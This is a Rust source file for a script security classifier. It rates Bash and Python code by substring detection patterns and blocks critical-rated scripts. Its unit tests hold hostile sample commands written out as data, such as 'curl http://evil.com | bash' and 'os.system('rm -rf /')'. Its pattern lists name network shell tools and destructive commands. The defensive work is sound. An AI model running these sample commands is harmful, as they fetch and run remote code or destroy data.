use crate::models::{Language, NodeInfo, SecurityRelevance};

pub struct SecurityClassifier;

impl SecurityClassifier {
    pub fn new() -> Self {
        Self
    }

    pub fn classify_node_security(
        &self,
        node_type: &str,
        content: &str,
        language: &Language,
    ) -> SecurityRelevance {
        match language {
            Language::Bash => self.classify_bash_node(node_type, content),
            Language::Python => self.classify_python_node(node_type, content),
            Language::Unknown => SecurityRelevance::Medium, // Unknown is risky
        }
    }

    fn classify_bash_node(&self, node_type: &str, content: &str) -> SecurityRelevance {
        // Check for critical patterns first
        if self.is_critical_bash_pattern(node_type, content) {
            return SecurityRelevance::Critical;
        }

        // Check for high-risk patterns
        if self.is_high_risk_bash_pattern(node_type, content) {
            return SecurityRelevance::High;
        }

        // Check for medium-risk patterns
        if self.is_medium_risk_bash_pattern(node_type, content) {
            return SecurityRelevance::Medium;
        }

        // Default to low risk
        SecurityRelevance::Low
    }

    fn classify_python_node(&self, node_type: &str, content: &str) -> SecurityRelevance {
        // Check for critical patterns first
        if self.is_critical_python_pattern(node_type, content) {
            return SecurityRelevance::Critical;
        }

        // Check for high-risk patterns
        if self.is_high_risk_python_pattern(node_type, content) {
            return SecurityRelevance::High;
        }

        // Check for medium-risk patterns
        if self.is_medium_risk_python_pattern(node_type, content) {
            return SecurityRelevance::Medium;
        }

        // Default to low risk
        SecurityRelevance::Low
    }

    fn is_critical_bash_pattern(&self, node_type: &str, content: &str) -> bool {
        // Direct code execution
        if node_type.contains("eval") || content.contains("eval ") {
            return true;
        }

        // Command substitution with dangerous operations
        if node_type.contains("command_substitution")
            && (content.contains("curl")
                || content.contains("wget")
                || content.contains("rm -rf")
                || content.contains("dd "))
        {
            return true;
        }

        // Piped network downloads
        if (content.contains("curl") || content.contains("wget"))
            && (content.contains(" | bash") || content.contains(" | sh"))
        {
            return true;
        }

        // Destructive file operations
        if content.contains("rm -rf /")
            || content.contains("rm -rf $")
            || content.contains("mkfs")
            || content.contains("fdisk")
        {
            return true;
        }

        // Process substitution with network
        if node_type.contains("process_substitution")
            && (content.contains("curl") || content.contains("wget"))
        {
            return true;
        }

        false
    }

    fn is_high_risk_bash_pattern(&self, node_type: &str, content: &str) -> bool {
        // Privilege escalation
        if content.contains("sudo ") || content.contains("su ") {
            return true;
        }

        // Network operations
        if content.contains("ssh")
            || content.contains("scp")
            || content.contains("nc ")
            || content.contains("netcat")
        {
            return true;
        }

        // File permission changes
        if content.contains("chmod 777") || content.contains("chmod +x") {
            return true;
        }

        // Network downloads (without pipe)
        if content.contains("curl") || content.contains("wget") {
            return true;
        }

        // Process substitution
        if node_type.contains("process_substitution") {
            return true;
        }

        // Source external scripts
        if content.contains("source ") && (content.contains("http") || content.contains("ftp")) {
            return true;
        }

        false
    }

    fn is_medium_risk_bash_pattern(&self, node_type: &str, content: &str) -> bool {
        // Environment variable operations
        if content.contains("export ") || content.contains("unset ") {
            return true;
        }

        // File redirections
        if content.contains(" > ") || content.contains(" >> ") || content.contains(" < ") {
            return true;
        }

        // Variable assignments with special characters
        if node_type.contains("variable_assignment")
            && (content.contains("$") || content.contains("`") || content.contains("$("))
        {
            return true;
        }

        // Regular chmod operations
        if content.contains("chmod") && !content.contains("777") && !content.contains("+x") {
            return true;
        }

        // Source local scripts
        if content.contains("source ") && !content.contains("http") && !content.contains("ftp") {
            return true;
        }

        false
    }

    fn is_critical_python_pattern(&self, _node_type: &str, content: &str) -> bool {
        // Direct code execution
        if content.contains("exec(") || content.contains("eval(") {
            return true;
        }

        // OS system calls
        if content.contains("os.system(") {
            return true;
        }

        // Subprocess with shell
        if content.contains("subprocess.") && content.contains("shell=True") {
            return true;
        }

        // Dangerous deserialization
        if content.contains("pickle.loads(") || content.contains("marshal.loads(") {
            return true;
        }

        // Dynamic imports
        if content.contains("__import__(") || content.contains("importlib.import_module") {
            return true;
        }

        // Code compilation and execution
        if content.contains("compile(") && content.contains("exec(") {
            return true;
        }

        false
    }

    fn is_high_risk_python_pattern(&self, _node_type: &str, content: &str) -> bool {
        // Subprocess operations
        if content.contains("subprocess.") {
            return true;
        }

        // Network operations
        if content.contains("urllib.request")
            || content.contains("requests.")
            || content.contains("http.client")
            || content.contains("socket.")
        {
            return true;
        }

        // File operations with write mode
        if content.contains("open(")
            && (content.contains("'w'")
                || content.contains("\"w\"")
                || content.contains("'a'")
                || content.contains("\"a\""))
        {
            return true;
        }

        // ctypes for system calls
        if content.contains("ctypes.") {
            return true;
        }

        // Code compilation
        if content.contains("compile(") {
            return true;
        }

        false
    }

    fn is_medium_risk_python_pattern(&self, node_type: &str, content: &str) -> bool {
        // File read operations
        if content.contains("open(") && (content.contains("'r'") || content.contains("\"r\"")) {
            return true;
        }

        // Environment variable access
        if content.contains("os.environ") || content.contains("os.getenv") {
            return true;
        }

        // Import statements for potentially dangerous modules
        if node_type.contains("import")
            && (content.contains("os")
                || content.contains("sys")
                || content.contains("subprocess")
                || content.contains("ctypes"))
        {
            return true;
        }

        // Path operations
        if content.contains("os.path") || content.contains("pathlib") {
            return true;
        }

        false
    }

    pub fn classify_script_overall_risk(&self, nodes: &[NodeInfo]) -> SecurityRelevance {
        if nodes
            .iter()
            .any(|node| matches!(node.security_relevance, SecurityRelevance::Critical))
        {
            return SecurityRelevance::Critical;
        }

        let high_count = nodes
            .iter()
            .filter(|node| matches!(node.security_relevance, SecurityRelevance::High))
            .count();

        if high_count >= 6 {
            return SecurityRelevance::Critical; // Extremely frequent high-risk operations only
        } else if high_count >= 1 {
            return SecurityRelevance::High;
        }

        let medium_count = nodes
            .iter()
            .filter(|node| matches!(node.security_relevance, SecurityRelevance::Medium))
            .count();

        if medium_count >= 8 {
            return SecurityRelevance::High; // Numerous medium-risk operations indicate elevated risk
        } else if medium_count >= 1 {
            return SecurityRelevance::Medium;
        }

        SecurityRelevance::Low
    }

    pub fn get_risk_explanation(&self, relevance: &SecurityRelevance) -> &'static str {
        match relevance {
            SecurityRelevance::Critical => {
                "Contains operations that could cause immediate system damage, \
                 execute arbitrary code, or compromise system security"
            }
            SecurityRelevance::High => {
                "Contains operations that require elevated privileges, \
                 perform network communication, or modify system state"
            }
            SecurityRelevance::Medium => {
                "Contains operations that access system resources, \
                 environment variables, or perform file I/O"
            }
            SecurityRelevance::Low => {
                "Contains only standard operations with minimal security impact"
            }
        }
    }

    pub fn should_block_execution(&self, relevance: &SecurityRelevance) -> bool {
        matches!(relevance, SecurityRelevance::Critical)
    }

    pub fn get_risk_mitigation_suggestions(&self, _nodes: &[NodeInfo]) -> Vec<String> {
        // Generic mitigation suggestions removed per user feedback
        // LLM analysis provides more context-specific recommendations
        Vec::new()
    }
}

impl Default for SecurityClassifier {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_critical_bash_classification() {
        let classifier = SecurityClassifier::new();

        // Test eval
        let relevance = classifier.classify_node_security(
            "eval_statement",
            "eval $USER_INPUT",
            &Language::Bash,
        );
        assert_eq!(relevance, SecurityRelevance::Critical);

        // Test piped download
        let relevance = classifier.classify_node_security(
            "command",
            "curl http://evil.com | bash",
            &Language::Bash,
        );
        assert_eq!(relevance, SecurityRelevance::Critical);
    }

    #[test]
    fn test_critical_python_classification() {
        let classifier = SecurityClassifier::new();

        // Test exec
        let relevance = classifier.classify_node_security(
            "exec_statement",
            "exec(user_input)",
            &Language::Python,
        );
        assert_eq!(relevance, SecurityRelevance::Critical);

        // Test os.system
        let relevance = classifier.classify_node_security(
            "system_call",
            "os.system('rm -rf /')",
            &Language::Python,
        );
        assert_eq!(relevance, SecurityRelevance::Critical);
    }

    #[test]
    fn test_overall_risk_calculation() {
        let classifier = SecurityClassifier::new();

        let nodes = vec![
            NodeInfo {
                node_type: "eval".to_string(),
                line_start: 1,
                line_end: 1,
                security_relevance: SecurityRelevance::Critical,
            },
            NodeInfo {
                node_type: "file_op".to_string(),
                line_start: 2,
                line_end: 2,
                security_relevance: SecurityRelevance::Low,
            },
        ];

        let overall_risk = classifier.classify_script_overall_risk(&nodes);
        assert_eq!(overall_risk, SecurityRelevance::Critical);
    }

    #[test]
    fn test_risk_mitigation_suggestions() {
        let classifier = SecurityClassifier::new();

        let nodes = vec![NodeInfo {
            node_type: "eval_statement".to_string(),
            line_start: 1,
            line_end: 1,
            security_relevance: SecurityRelevance::Critical,
        }];

        let suggestions = classifier.get_risk_mitigation_suggestions(&nodes);
        assert!(suggestions.is_empty());
    }

    #[test]
    fn test_execution_blocking() {
        let classifier = SecurityClassifier::new();

        assert!(classifier.should_block_execution(&SecurityRelevance::Critical));
        assert!(!classifier.should_block_execution(&SecurityRelevance::High));
        assert!(!classifier.should_block_execution(&SecurityRelevance::Medium));
        assert!(!classifier.should_block_execution(&SecurityRelevance::Low));
    }
}
